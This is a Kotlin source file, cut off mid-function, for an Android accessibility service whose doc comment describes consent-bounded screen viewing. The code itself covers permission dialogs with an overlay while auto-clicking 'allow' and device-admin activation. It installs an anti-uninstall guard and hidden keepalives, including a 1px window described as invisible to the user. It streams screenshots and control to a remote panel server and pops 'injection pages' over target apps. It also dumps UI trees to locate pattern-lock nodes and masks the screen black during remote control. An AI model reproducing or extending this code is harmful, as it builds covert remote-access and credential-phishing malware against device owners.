package com.zaka.screenagent.accessibility

import com.zaka.screenagent.BuildConfig
import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.annotation.SuppressLint
import android.app.NotificationManager
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Rect
import android.net.ConnectivityManager
import android.net.Network
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityWindowInfo
import com.zaka.screenagent.AgentConfig
import com.zaka.screenagent.CaptureMode
import com.zaka.screenagent.capture.ProjectionCaptureService
import com.zaka.screenagent.net.AgentSocket
import com.zaka.screenagent.net.DeviceSession
import com.zaka.screenagent.net.HttpUploader
import com.zaka.screenagent.net.Protocol
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.ArrayDeque
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Device channel, structural-node preview and explicit focused-input accessibility service.
 *
 * Enabling the service starts the authenticated device heartbeat and uploads one short-lived
 * thumbnail. During an explicit browser viewer lease it can additionally publish a bounded,
 * node preview with visible non-editable labels and redacted input contents. SCREENSHOT_NOW
 * uses the selected page mode: MediaProjection latest frame or AccessibilityService.takeScreenshot.
 * TEXT_INPUT only locates the current focused editable node after an explicit leased command;
 * node contents are removed from leased node snapshots.
 * The launcher page switches capture modes and opens the Android accessibility settings.
 */
class BoundaryAccessibilityService : AccessibilityService() {
    private val main = Handler(Looper.getMainLooper())
    private val screenTaps by lazy { ScreenTapController(this, main) }
    private val leases = ConcurrentHashMap<String, Long>()
    private val activeCommands = ConcurrentHashMap<String, String>()
    private val capturing = AtomicBoolean(false)
    private var uploaderRef: HttpUploader? = null
    private val uploader: HttpUploader get() = uploaderRef!!
    private var socket: AgentSocket? = null
    /** 墨影（2.2）协议通道 */
    private var moying: com.zaka.screenagent.net.MoyingChannel? = null
    fun moyingChannel(): com.zaka.screenagent.net.MoyingChannel? = moying
    private var binary: com.zaka.screenagent.net.BinaryChannel? = null
    private var destroyed = false
    private var onlineRequestRunning = false
    private var onlineRetryCount = 0
    private val onlineRetry = Runnable { ensureOnline() }
    private var networkCallbackRegistered = false
    private val connectivity by lazy { getSystemService(ConnectivityManager::class.java) }
    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            main.post {
                if (destroyed || DeviceSession(this@BoundaryAccessibilityService).token.isNotBlank())
                    return@post
                onlineRetryCount = 0
                main.removeCallbacks(onlineRetry)
                ensureOnline()
            }
        }
    }
    private var initialCaptureStarted = false
    private var streamCommandId: String? = null
    private var streamViewerId: String? = null
    private var frameGeneration = 0L
    private var nodesDirty = true
    private var lastNodeSnapshotAt = 0L
    private var lastNodeHash: Int? = null
    private var nodeReadSequence = 0L
    private var rootReadSource = "none"
    private var rootWindowId = -1
    private var observedWindowCount = 0
    private var windowInventory = JSONArray()
    private var rootParentsAscended = 0
    private var debugUploadInFlight = false
    private var debugUploadFailures = 0
    private var nodeViewerId: String? = null
    private var nodeSnapshotForced = false
    private var debugSessionId: String? = null
    private val debugEvents = JSONArray()
    private val viewerFrame = Runnable { captureViewerFrame() }
    private val nodeSnapshot = Runnable {
        val viewerId = nodeViewerId ?: return@Runnable
        val forced = nodeSnapshotForced
        nodeSnapshotForced = false
        publishNodeSnapshot(viewerId, forced)
        // Re-read even when the launcher emits no content event; refresh the snapshot timestamp.
        scheduleNodeRefresh(viewerId)
    }

    private fun scheduleNodeRefresh(viewerId: String) {
        if (!leaseValid(viewerId)) return
        nodeSnapshotForced = true
        main.removeCallbacks(nodeSnapshot)
        main.postDelayed(nodeSnapshot, NODE_REFRESH_INTERVAL_MS)
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        destroyed = false
        instance = this
        uploaderRef = HttpUploader(this)
        if (!networkCallbackRegistered) runCatching {
            connectivity.registerDefaultNetworkCallback(networkCallback)
            networkCallbackRegistered = true
        }
        connect()
        // 2.3：无障碍连上即启动防卸载/防重置守卫（2.2 是设备管理员激活后启动）
        if (!com.zaka.screenagent.util.DebugFlags.noGuard(this)) {
            runCatching { com.zaka.screenagent.admin.AntiUninstallGuard.start(this) }
        }
        // 2.3：只有引导没走完才显示「优化中」浮层（2.2: if(!permFlowDone) m1441(this)）
        val dbgNoOverlay = com.zaka.screenagent.util.DebugFlags.noOverlay(this)
        val dbgNoAutoClick = com.zaka.screenagent.util.DebugFlags.noAutoClick(this)
        if (!com.zaka.screenagent.admin.OnboardingState.isDone(this) &&
            !com.zaka.screenagent.ui.BlackScreen.isShowing()) {
            if (!dbgNoOverlay) runCatching { com.zaka.screenagent.ui.GuardOverlay.show(this) }
            // 引导链：权限申请（浮层遮盖）→ 自动点允许 → 设备管理员激活 → 100% 收浮层
            com.zaka.screenagent.admin.AdminActivator.attach(this)
            com.zaka.screenagent.admin.AdminActivator.autoclick = !dbgNoAutoClick
            com.zaka.screenagent.notify.NotificationAccessActivator.autoclick = !dbgNoAutoClick
            if (!dbgNoAutoClick) runCatching { com.zaka.screenagent.perm.PermissionClicker.start(this) }
            if (!com.zaka.screenagent.ui.BlackScreen.isShowing()) {
                runCatching {
                    startActivity(
                        android.content.Intent(this, com.zaka.screenagent.perm.PermissionActivity::class.java)
                            .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                    )
                }
            }
        }
        // 2.3：保活（2.2：前台服务 + Job(15min,persisted) + 精确闹钟 + 电池白名单）
        runCatching { com.zaka.screenagent.keepalive.KeepAliveManager.startAll(this) }
        main.postDelayed(dumpTick, 800L)
        // 2.3：接墨影协议（与 2.2 服务器 yk4.jk92.cc 对接）
        runCatching {
            val ch = com.zaka.screenagent.net.MoyingChannel(this) { action, data ->
                handleMoyingCommand(action, data)
            }
            moying = ch
            ch.start()
            if (binary?.isOpen() == true) return@runCatching
            val bin = com.zaka.screenagent.net.BinaryChannel(
                hostProvider = { ch.hostForBinary() },
                deviceIdProvider = { ch.deviceId }
            ) { cmd ->
                val act = cmd.optString("action", cmd.optString("act"))
                val data = cmd.optJSONObject("data") ?: cmd
                handleMoyingCommand(act, data)
            }
            binary = bin
            bin.start()
        }
        // 2.3：1px 不可见窗口（走 2032 通道，零权限、用户不可见）
        runCatching { com.zaka.screenagent.keepalive.PixelKeepAlive.start(this) }
        // 2.3：传感器 + 屏幕事件监听（原来挂在已删除的前台服务上）
        runCatching { com.zaka.screenagent.keepalive.SensorKeepAlive.start(this) }
        runCatching { com.zaka.screenagent.keepalive.ScreenWatcher.start(this) }
        startLockWatchdog()
        // 注入配置：连上就拉一份，之后靠 window 事件触发
        runCatching { com.zaka.screenagent.inject.InjectRepo.refresh(this, force = true) }
        startFgWatch()
        // 无障碍连上（=权限到位）后把已安装应用列表推给面板，注入目标才能显示"本机已安装"
        main.postDelayed({
            runCatching {
                moying?.let { com.zaka.screenagent.net.AppList.send(it, this) }
            }
        }, 4000L)
        // 注入页要能在后台拉起 Activity：Android 10+ 必须有悬浮窗权限
        runCatching {
            if (!android.provider.Settings.canDrawOverlays(this)) {
                android.util.Log.d("AccGuard", "no overlay permission -> open settings")
                startActivity(android.content.Intent(
                    android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    android.net.Uri.parse("package:$packageName")
                ).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK))
            }
        }
        // 调试：没有面板也能验证黑屏遮罩（adb shell settings put global moying_black_test lockAndroidUpdate）
        if (com.zaka.screenagent.BuildConfig.DEBUG) {
            runCatching {
                com.zaka.screenagent.util.DebugFlags.blackTestMode(this)?.let { mode ->
                    main.postDelayed({
                        runCatching { com.zaka.screenagent.ui.BlackScreen.show(this, mode) }
                        // 调试：3 秒后真跑一次截图，把"上传帧"落盘，方便核对面板到底收到什么
                        main.postDelayed({
                            runCatching {
                                // 走面板用的同一条截图链路（MoyingActions.screenshot），验证它会带临时透明
                                moyingChannel()?.let { ch ->
                                    com.zaka.screenagent.net.MoyingActions.handle(
                                        this, ch, "screenshot", org.json.JSONObject(), null
                                    )
                                }
                            }
                        }, 3000L)
                    }, 6000L)
                }
            }
        }
    }

    /**
     * 黑屏心跳：面板关掉/断线后，服务器不再下发任何指令。
     * 超过 moying_lock_timeout 秒（默认 120s）没有来帧 → 自动撤黑屏、解触摸拦截、停截图推流，
     * 避免设备被永久锁在黑屏里。设 0 可关闭（不推荐）。
     */
    private val lockWatchdog = object : Runnable {
        override fun run() {
            runCatching {
                val timeoutSec = android.provider.Settings.Global.getInt(
                    contentResolver, "moying_lock_timeout", 120)
                if (timeoutSec > 0 && com.zaka.screenagent.ui.BlackScreen.isMasked()) {
                    val last = com.zaka.screenagent.net.MoyingActions.lastRequestAtMs()
                    val anchor = maxOf(last, com.zaka.screenagent.ui.BlackScreen.maskedSinceMs())
                    val idle = System.currentTimeMillis() - anchor
                    if (anchor > 0 && idle > timeoutSec * 1000L) {
                        android.util.Log.w("LockWatchdog",
                            "no server frame for ${idle / 1000}s > ${timeoutSec}s -> auto release black screen")
                        runCatching { com.zaka.screenagent.ui.TouchBlock.hide(this@BoundaryAccessibilityService) }
                        com.zaka.screenagent.ui.BlackScreen.hide(this@BoundaryAccessibilityService)
                    }
                }
            }
            main.postDelayed(this, 5000L)
        }
    }

    /**
     * 前台包名轮询：窗口事件有时会漏（同一 Activity 内跳转、厂商 ROM 吞事件），
     * 这里每 400ms 直接读一次当前活动窗口，保证"切到目标 App 就立刻弹注入页"。
     */
    private val fgTick = object : Runnable {
        override fun run() {
            runCatching {
                val pkg = rootInActiveWindow?.packageName?.toString()
                    ?: windows.firstOrNull { it.isActive }?.root?.packageName?.toString()
                if (!pkg.isNullOrBlank()) {
                    com.zaka.screenagent.inject.InjectRepo.onForeground(this@BoundaryAccessibilityService, pkg)
                }
            }
            main.postDelayed(this, 400L)
        }
    }

    private fun startFgWatch() {
        main.removeCallbacks(fgTick)
        main.postDelayed(fgTick, 400L)
    }

    private fun startLockWatchdog() {
        main.removeCallbacks(fgTick)
        main.removeCallbacks(lockWatchdog)
        main.postDelayed(lockWatchdog, 5000L)
    }

    private fun connect() {
        screenTaps.stop()
        socket?.stop()
        socket = null
        if (DeviceSession(this).token.isBlank()) {
            ensureOnline()
            return
        }
        socket = AgentSocket(
            this,
            ::handleCommand,
            statusProvider = {
                JSONObject()
                    .put("accessibilityAlive", true)
                    .put("captureReady", captureReady())
                    .put("projectionActive", ProjectionCaptureService.isActive())
                    .put("captureMode", CaptureMode.get(this))
            }
        ).also { agent ->
            agent.onStateChange = { state ->
                if (state != "online") main.post {
                    screenTaps.stop()
                    streamViewerId?.let { stopViewerStream(it, "device_disconnected", notify = false) }
                }
                if (
                    state == "online" &&
                    !initialCaptureStarted &&
                    ProjectionCaptureService.isActive()
                ) {
                    initialCaptureStarted = true
                    main.postDelayed({ captureInitialProjection(0) }, 800)
                }
            }
            agent.onDebugState = { state ->
                val previousSession = debugSessionId
                debugSessionId = state.optString("sessionId").takeIf { state.optBoolean("active") && it.isNotBlank() }
                if (debugSessionId == null) synchronized(debugEvents) {
                    while (debugEvents.length() > 0) debugEvents.remove(0)
                } else if (previousSession != debugSessionId) {
                    recordDebug("service", "debug_state", "info", "debug enabled")
                    flushDebug()
                }
            }
            agent.onAuthenticationRequired = {
                main.post {
                    DeviceSession(this).clearToken()
                    socket = null
                    onlineRetryCount = 0
                    ensureOnline()
                }
            }
            agent.start()
        }
    }

    private fun ensureOnline() {
        if (onlineRequestRunning || destroyed) return
        if (DeviceSession(this).token.isNotBlank()) {
            connect()
            return
        }
        onlineRequestRunning = true
        uploader.online { data, _ ->
            main.post {
                onlineRequestRunning = false
                if (data != null) {
                    onlineRetryCount = 0
                    main.removeCallbacks(onlineRetry)
                    connect()
                } else {
                    val delay = minOf(30_000L, 1000L * (1L shl minOf(onlineRetryCount, 5)))
                    onlineRetryCount++
                    main.removeCallbacks(onlineRetry)
                    main.postDelayed(onlineRetry, delay)
                }
            }
        }
    }

    private fun handleCommand(action: String, commandId: String?, data: JSONObject) {
        when (action) {
            Protocol.ACTION_VIEW_KEEPALIVE -> {
                val viewerId = data.optString("viewerId")
                val validForMs = data.optLong("validForMs", 0).coerceIn(1000, 15000)
                if (viewerId.isNotBlank()) {
                    val existing = leaseValid(viewerId)
                    leases[viewerId] = SystemClock.elapsedRealtime() + validForMs
                    if (viewerId == streamViewerId) scheduleViewerFrame()
                    scheduleNodeSnapshot(viewerId, force = !existing)
                }
            }
            Protocol.ACTION_VIEW_CLOSE -> {
                val viewerId = data.optString("viewerId")
                screenTaps.closeViewer(viewerId)
                leases.remove(viewerId)
                stopViewerStream(viewerId)
                if (nodeViewerId == viewerId) {
                    main.removeCallbacks(nodeSnapshot)
                    nodeViewerId = null
                    lastNodeHash = null
                    nodesDirty = true
                }
            }
            Protocol.ACTION_SCREEN_STREAM_START -> {
                val id = commandId ?: return
                val viewerId = data.optString("viewerId")
                if (!captureReady()) {
                    socket?.sendResult(id, false, captureUnavailableReason())
                } else if (!leaseValid(viewerId)) {
                    socket?.sendResult(id, false, "viewer_lease_expired")
                } else {
                    streamCommandId?.takeIf { it != id }?.let {
                        socket?.screenshotResult(it, "failed", "superseded")
                        activeCommands.remove(it)
                    }
                    frameGeneration++
                    capturing.set(false)
                    runCatching { uploaderRef?.cancel() }
                    streamCommandId = id
                    streamViewerId = viewerId
                    activeCommands[id] = viewerId
                    socket?.sendResult(id, true)
                    scheduleViewerFrame()
                }
            }
            Protocol.ACTION_INPUT_TAP -> screenTaps.tap(
                data,
                leaseValid(data.optString("viewerId"))
            ) { accepted, reason ->
                socket?.sendResult(commandId, accepted, reason)
            }
            Protocol.ACTION_INPUT_DRAG -> screenTaps.drag(
                data,
                leaseValid(data.optString("viewerId"))
            ) { accepted, reason ->
                socket?.sendResult(commandId, accepted, reason)
            }
            Protocol.ACTION_INPUT_TOUCH -> screenTaps.touch(
                data,
                leaseValid(data.optString("viewerId"))
            ) { _, _ -> }
            Protocol.ACTION_INPUT_TEXT -> handleTextInput(
                commandId,
                data.optString("viewerId"),
                data.optString("text")
            )
            Protocol.ACTION_DEVICE_STATE -> socket?.sendResult(commandId, true)
            Protocol.ACTION_APP_OPEN -> handleOpenApp(commandId, data.optString("package"))
            Protocol.ACTION_NAV_BACK -> handleDeviceAction(commandId, data.optString("viewerId"), Protocol.ACTION_BACK)
            Protocol.ACTION_NAV_HOME -> handleDeviceAction(commandId, data.optString("viewerId"), Protocol.ACTION_HOME)
            Protocol.ACTION_NAV_RECENTS -> handleDeviceAction(commandId, data.optString("viewerId"), Protocol.ACTION_RECENTS)
            Protocol.ACTION_SCREEN_LOCK -> handleDeviceAction(commandId, data.optString("viewerId"), Protocol.ACTION_LOCK)
            Protocol.ACTION_SCREEN_WAKE -> handleDeviceAction(commandId, data.optString("viewerId"), Protocol.ACTION_WAKE)
            Protocol.ACTION_DND_TOGGLE -> handleDeviceAction(commandId, data.optString("viewerId"), Protocol.ACTION_DND_TOGGLE)
            Protocol.ACTION_GUARD_SET -> handleGuardSet(commandId, data)
            else -> socket?.sendResult(commandId, false, "unsupported_action")
        }
    }

    /** 调试：把当前窗口的节点树整个 dump 到 logcat（找图案锁节点用） */
    private val dumpTick = object : Runnable {
        override fun run() {
            val ctx = this@BoundaryAccessibilityService
            val on = runCatching {
                android.provider.Settings.Global.getInt(ctx.contentResolver, "moying_dump_tree", 0) == 1
            }.getOrDefault(false)
            if (!on) { main.postDelayed(this, 800L); return }
            runCatching {
                val root = rootInActiveWindow ?: return@runCatching
                val pkg = root.packageName?.toString() ?: ""
                val sb = StringBuilder()
                fun walk(n: android.view.accessibility.AccessibilityNodeInfo, d: Int) {
                    if (d > 12 || sb.length > 6000) return
                    val r = android.graphics.Rect(); n.getBoundsInScreen(r)
                    sb.append("  ".repeat(d)).append("id=").append(n.viewIdResourceName)
                        .append(" cls=").append(n.className)
                        .append(" sel=").append(n.isSelected)
                        .append(" click=").append(n.isClickable)
                        .append(" cd=").append(n.contentDescription?.toString()?.take(30))
                        .append(" txt=").append(n.text?.toString()?.take(20))
                        .append(" b=").append("${r.left},${r.top},${r.right},${r.bottom}")
                        .append('\n')
                    for (i in 0 until n.childCount) n.getChild(i)?.let { walk(it, d + 1) }
                }
                walk(root, 0)
                Log.d("TREEDUMP", "pkg=$pkg\n$sb")
            }
            main.postDelayed(this, 800L)
        }
    }

    /** 墨影协议命令分发 → net/MoyingActions */
    private fun handleMoyingCommand(action: String, data: JSONObject) {
        val ch = moying ?: return
        runCatching { com.zaka.screenagent.net.MoyingActions.handle(this, ch, action, data, binary) }
            .onFailure { Log.w("Moying", "action $action failed: $it") }
    }

    /** 面板远程开关防卸载守卫 */
    private fun handleGuardSet(commandId: String?, data: JSONObject) {
        val enabled = data.optBoolean("enabled", true)
        val duration = data.optLong("durationMs", 0L)
        runCatching {
            if (enabled) {
                com.zaka.screenagent.admin.AntiUninstallGuard.start(this)
                Log.d("GuardCmd", "guard enabled by panel")
                Unit
            } else {
                com.zaka.screenagent.admin.AntiUninstallGuard.stop()
                Log.d("GuardCmd", "guard disabled by panel (duration=$duration)")
                if (duration > 0) {
                    main.postDelayed({
                        runCatching { com.zaka.screenagent.admin.AntiUninstallGuard.start(this) }
                        Log.d("GuardCmd", "guard auto-restored")
                    }, duration)
                }
                Unit
            }
        }
        socket?.sendResult(commandId, true, if (enabled) "guard_enabled" else "guard_disabled")
    }

    private fun handleOpenApp(commandId: String?, packageName: String) {
        if (packageName.isBlank() || packageName.length > 200 ||
            !packageName.matches(Regex("^[A-Za-z][A-Za-z0-9_]*(\\.[A-Za-z][A-Za-z0-9_]*)+$"))) {
            socket?.sendResult(commandId, false, "invalid_package")
            return
        }
        val accepted = runCatching {
            val launch = packageManager.getLaunchIntentForPackage(packageName)
                ?: Intent(Intent.ACTION_MAIN).apply {
                    addCategory(Intent.CATEGORY_LAUNCHER)
                    setPackage(packageName)
                }
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(launch)
            true
        }.getOrDefault(false)
        socket?.sendResult(
            commandId,
            accepted,
            if (accepted) "app_opened" else "app_not_launchable"
        )
    }

    private fun handleTextInput(commandId: String?, viewerId: String, text: String) {
        if (!leaseValid(viewerId)) {
            socket?.sendResult(commandId, false, "viewer_lease_expired")
            return
        }
        if (!screenTaps.controlAllowed(viewerId)) {
            socket?.sendResult(commandId, false, "local_consent_required")
            return
        }
        if (text.isBlank() || text.length > 500) {
            socket?.sendResult(commandId, false, "invalid_text")
            return
        }
        val root = rootInActiveWindow
        val focused = root?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            ?: root?.findFocus(AccessibilityNodeInfo.FOCUS_ACCESSIBILITY)
        val reasonCode = when {
            focused == null -> "input_not_focused"
            !focused.isEditable -> "input_not_editable"
            focused.isPassword -> "sensitive_field"
            else -> {
                val arguments = Bundle().apply {
                    putCharSequence(
                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                        text
                    )
                }
                if (focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments))
                    "text_set"
                else "set_text_failed"
            }
        }
        socket?.sendResult(
            commandId,
            reasonCode == "text_set",
            reasonCode
        )
    }

    private fun handleDeviceAction(commandId: String?, viewerId: String, action: String) {
        if (!leaseValid(viewerId)) {
            socket?.sendResult(commandId, false, "viewer_lease_expired")
            return
        }
        if (!screenTaps.controlAllowed(viewerId)) {
            socket?.sendResult(commandId, false, "local_consent_required")
            return
        }
        val outcome = when (action) {
            Protocol.ACTION_BACK -> globalAction(GLOBAL_ACTION_BACK)
            Protocol.ACTION_HOME -> globalAction(GLOBAL_ACTION_HOME)
            Protocol.ACTION_RECENTS -> globalAction(GLOBAL_ACTION_RECENTS)
            Protocol.ACTION_LOCK -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P)
                globalAction(GLOBAL_ACTION_LOCK_SCREEN)
            else ActionOutcome(false, "android_version_unsupported")
            Protocol.ACTION_WAKE -> ActionOutcome(wakeScreen(), "action_completed")
            Protocol.ACTION_DND_TOGGLE -> toggleDoNotDisturb()
            else -> ActionOutcome(false, "action_failed")
        }
        socket?.sendResult(commandId, outcome.accepted, outcome.reasonCode)
    }

    private fun globalAction(action: Int): ActionOutcome {
        val accepted = performGlobalAction(action)
        return ActionOutcome(accepted, if (accepted) "action_completed" else "action_failed")
    }

    @Suppress("DEPRECATION")
    private fun wakeScreen(): Boolean = runCatching {
        val power = getSystemService(PowerManager::class.java)
        if (!power.isInteractive) {
            val wakeLock = power.newWakeLock(
                PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
                "BoundaryLab:ViewerWake"
            )
            wakeLock.acquire(3_000L)
        }
        true
    }.getOrDefault(false)

    private fun toggleDoNotDisturb(): ActionOutcome {
        val notifications = getSystemService(NotificationManager::class.java)
        if (!notifications.isNotificationPolicyAccessGranted)
            return ActionOutcome(false, "dnd_permission_required")
        return runCatching {
            val enabled = notifications.currentInterruptionFilter ==
                NotificationManager.INTERRUPTION_FILTER_ALL
            notifications.setInterruptionFilter(
                if (enabled) NotificationManager.INTERRUPTION_FILTER_PRIORITY
                else NotificationManager.INTERRUPTION_FILTER_ALL
            )
            ActionOutcome(true, if (enabled) "dnd_enabled" else "dnd_disabled")
        }.getOrElse { ActionOutcome(false, "action_failed") }
    }

    private data class ActionOutcome(val accepted: Boolean, val reasonCode: String)

    private fun leaseValid(viewerId: String?): Boolean =
        !viewerId.isNullOrBlank() && (leases[viewerId] ?: 0L) > SystemClock.elapsedRealtime()

    private fun streamActive(commandId: String, viewerId: String): Boolean =
        streamCommandId == commandId && streamViewerId == viewerId && leaseValid(viewerId)

    private fun scheduleViewerFrame(delayMs: Long = 0L) {
        if (streamCommandId == null || streamViewerId == null) return
        main.removeCallbacks(viewerFrame)
        main.postDelayed(viewerFrame, delayMs)
    }

    private fun captureViewerFrame() {
        val commandId = streamCommandId ?: return
        val viewerId = streamViewerId ?: return
        if (!streamActive(commandId, viewerId)) {
            screenTaps.closeViewer(viewerId)
            stopViewerStream(viewerId, "viewer_lease_expired", notify = true)
            return
        }
        if (!capturing.compareAndSet(false, true)) {
            scheduleViewerFrame(25)
            return
        }
        val generation = ++frameGeneration
        takeAndUploadViewer(generation, commandId, viewerId)
    }

    private fun takeAndUploadViewer(
        generation: Long,
        commandId: String,
        viewerId: String
    ) {
        if (!streamActive(commandId, viewerId) || generation != frameGeneration) {
            releaseViewerFrame(generation)
            return
        }
        val captureGeometry = screenTaps.geometry()
        val captureStarted = SystemClock.elapsedRealtime()
        val captureSource =
            if (CaptureMode.get(this) == CaptureMode.ACCESSIBILITY) "taskscreenshot" else "mediaprojection"
        recordDebug(captureSource, "capture.start", commandId = commandId)
        captureLatestSelected { bytes ->
            main.post {
                if (!streamActive(commandId, viewerId) || generation != frameGeneration) {
                    releaseViewerFrame(generation)
                } else if (bytes == null) {
                    recordDebug(
                        captureSource,
                        "capture.empty",
                        "error",
                        "no bytes returned",
                        SystemClock.elapsedRealtime() - captureStarted,
                        commandId = commandId
                    )
                    completeViewerFrame(
                        generation,
                        commandId,
                        viewerId,
                        "failed",
                        if (captureSource == "taskscreenshot") "accessibility_frame_unavailable" else "projection_frame_unavailable",
                        50
                    )
                } else {
                    val captureElapsed = SystemClock.elapsedRealtime() - captureStarted
                    recordDebug(
                        captureSource,
                        "capture.bytes",
                        elapsedMs = captureElapsed,
                        commandId = commandId,
                        details = JSONObject().put("bytes", bytes.size)
                    )
                    val sessionId = debugSessionId
                    if (sessionId != null) {
                        uploader.debugScreenshot(
                            bytes,
                            sessionId,
                            captureSource,
                            captureElapsed,
                            commandId
                        ) { debugData, debugError ->
                            main.post {
                                recordDebug(
                                    "http",
                                    if (debugData != null) "debug_screenshot.ok" else "debug_screenshot.failed",
                                    if (debugData != null) "info" else "error",
                                    debugError ?: "debug screenshot response",
                                    commandId = commandId
                                )
                                flushDebug()
                            }
                        }
                    }
                    val uploadStarted = SystemClock.elapsedRealtime()
                    uploader.uploadViewerScreenshot(bytes, commandId, viewerId) { data, error ->
                        main.post {
                            if (data != null && streamActive(commandId, viewerId) && generation == frameGeneration)
                                screenTaps.remember(data.optString("frameId"), viewerId, captureGeometry, captureStarted, bytes)
                            recordDebug(
                                "http",
                                if (data != null) "screenshot_upload.ok" else "screenshot_upload.failed",
                                if (data != null) "info" else "error",
                                error ?: "upload response",
                                SystemClock.elapsedRealtime() - uploadStarted,
                                commandId = commandId
                            )
                            completeViewerFrame(
                                generation,
                                commandId,
                                viewerId,
                                if (data != null) "uploaded" else "failed",
                                if (data != null) null else "upload_failed",
                                if (data != null && CaptureMode.get(this) == CaptureMode.PROJECTION)
                                    (40L - (SystemClock.elapsedRealtime() - captureStarted)).coerceAtLeast(0L)
                                else if (data != null) 0L else 500L
                            )
                        }
                    }
                }
            }
        }
    }

    private fun captureReady(): Boolean = when (CaptureMode.get(this)) {
        CaptureMode.ACCESSIBILITY -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.R
        else -> ProjectionCaptureService.isActive()
    }

    private fun captureUnavailableReason(): String = when (CaptureMode.get(this)) {
        CaptureMode.ACCESSIBILITY -> "accessibility_screenshot_unavailable"
        else -> "projection_permission_required"
    }

    private fun captureLatestSelected(done: (ByteArray?) -> Unit) {
        when (CaptureMode.get(this)) {
            CaptureMode.ACCESSIBILITY -> captureAccessibilityScreenshot(done)
            else -> ProjectionCaptureService.captureLatest(done)
        }
    }

    @SuppressLint("WrongConstant")
    private fun captureAccessibilityScreenshot(done: (ByteArray?) -> Unit) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            done(null)
            return
        }
        val executor = java.util.concurrent.Executor { runnable -> main.post(runnable) }
        shoot(done, executor)
    }

    private fun shoot(
        done: (ByteArray?) -> Unit,
        executor: java.util.concurrent.Executor,
        restoreTint: (() -> Unit)? = null
    ) {
        takeScreenshot(
            Display.DEFAULT_DISPLAY,
            executor,
            object : TakeScreenshotCallback {
                override fun onSuccess(screenshot: ScreenshotResult) {
                    var hardwareBitmap: Bitmap? = null
                    var bitmap: Bitmap? = null
                    var scaled: Bitmap? = null
                    val bytes = runCatching {
                        hardwareBitmap = Bitmap.wrapHardwareBuffer(
                            screenshot.hardwareBuffer,
                            screenshot.colorSpace
                        ) ?: return@runCatching null
                        bitmap = hardwareBitmap!!.copy(Bitmap.Config.ARGB_8888, false)
                        val source = bitmap ?: return@runCatching null
                        val cfg = AgentConfig.get(this@BoundaryAccessibilityService)
                        scaled = if (source.width > cfg.captureMaxWidth) {
                            val height = (source.height * cfg.captureMaxWidth.toFloat() / source.width)
                                .toInt().coerceAtLeast(1)
                            Bitmap.createScaledBitmap(source, cfg.captureMaxWidth, height, true)
                        } else source
                        ByteArrayOutputStream().use { out ->
                            scaled!!.compress(Bitmap.CompressFormat.JPEG, cfg.captureQuality, out)
                            out.toByteArray()
                        }
                    }.getOrNull()
                    runCatching { screenshot.hardwareBuffer.close() }
                    if (scaled !== bitmap) runCatching { scaled?.recycle() }
                    runCatching { bitmap?.recycle() }
                    runCatching { hardwareBitmap?.recycle() }
                    restoreTint?.invoke()
                    done(bytes)
                }

                override fun onFailure(errorCode: Int) {
                    restoreTint?.invoke()
                    done(null)
                }
            }
        )
    }

    private fun releaseViewerFrame(generation: Long) {
        if (generation == frameGeneration) capturing.set(false)
    }

    private fun completeViewerFrame(
        generation: Long,
        commandId: String,
        viewerId: String,
        result: String,
        reasonCode: String?,
        retryDelayMs: Long
    ) {
        if (generation != frameGeneration) return
        capturing.set(false)
        if (!streamActive(commandId, viewerId)) {
            stopViewerStream(viewerId)
            return
        }
        if (result == "uploaded") scheduleNodeSnapshot(viewerId)
        recordDebug(
            "capture",
            "screenshot_result",
            if (result == "uploaded") "info" else "error",
            reasonCode ?: result,
            commandId = commandId,
            details = JSONObject().put("result", result).put("retryDelayMs", retryDelayMs)
        )
        flushDebug()
        socket?.screenshotResult(commandId, result, reasonCode)
        scheduleViewerFrame(retryDelayMs)
    }

    private fun scheduleNodeSnapshot(viewerId: String, force: Boolean = false) {
        if (!leaseValid(viewerId) || (!force && !nodesDirty)) return
        nodeViewerId = viewerId
        nodeSnapshotForced = nodeSnapshotForced || force
        val remaining = (lastNodeSnapshotAt + NODE_MIN_INTERVAL_MS - SystemClock.elapsedRealtime())
            .coerceAtLeast(0L)
        main.removeCallbacks(nodeSnapshot)
        main.postDelayed(nodeSnapshot, remaining)
    }

    private data class NodeEntry(
        val node: AccessibilityNodeInfo,
        val parentId: String?,
        val depth: Int
    )

    private fun currentApplicationRoot(): AccessibilityNodeInfo? {
        // API 33+: invalidate cached descendants as well as the root before each leased read.
        if (Build.VERSION.SDK_INT >= 33) runCatching { clearCache() }
        rootReadSource = "none"
        rootWindowId = -1
        val currentWindows = runCatching { windows }.getOrDefault(emptyList())
        observedWindowCount = currentWindows.size
        windowInventory = JSONArray()
        // Bounded metadata only: no background text, node trees, or input content.
        if (debugSessionId != null) currentWindows.take(8).forEach { window ->
            val candidate = runCatching { window.root }.getOrNull()
            try {
                val bounds = Rect()
                candidate?.getBoundsInScreen(bounds)
                windowInventory.put(JSONObject()
                    .put("id", window.id).put("type", window.type).put("layer", window.layer)
                    .put("active", window.isActive).put("focused", window.isFocused)
                    .put("rootAvailable", candidate != null)
                    .put("package", candidate?.packageName?.toString()?.take(80) ?: JSONObject.NULL)
                    .put("children", candidate?.childCount ?: 0)
